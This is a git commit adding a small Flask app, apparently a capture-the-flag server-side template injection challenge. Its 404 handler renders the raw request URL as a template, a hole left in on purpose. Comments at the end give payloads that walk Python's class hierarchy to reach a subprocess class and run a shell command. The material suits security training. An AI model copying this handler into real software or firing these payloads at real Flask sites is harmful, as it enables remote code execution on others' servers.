4f91a3f5f9522b9a3b95e6a04c3cca086c0000a4
Eunho <eunhokim98@naver.com>
2022-12-30 16:08:36 +0900

    ssti_수정

---
+++ web/ssti/app.py
@@ -0,0 +1,27 @@
+from flask import Flask,request,render_template_string 
+from urllib.parse import unquote
+
+app = Flask(__name__)
+
+with open('flag.txt', 'r') as f:
+	flag = f.read()
+    
+app.secret_key=str(flag)
+
+@app.route("/")
+def main_page():
+    return "Hey there, this is my cool weeb site."
+
+@app.errorhandler(404) 
+def page_not_found(error): 
+    url = unquote(request.url) 
+    return render_template_string("<h1>URL %s not found</h1><br/>" % url), 404 
+
+
+if __name__ == '__main__': 
+    app.run(debug = False, host = '0.0.0.0')
+
+
+#{{ ''.__class__.__mro__[1].__subclasses__() }}
+#{{ ''.__class__.__mro__[1].__subclasses__()[236] }}
+#{{''.__class__.__mro__[1].__subclasses__()[236]('ls -al',shell=True,stdout=-1).communicate()}}
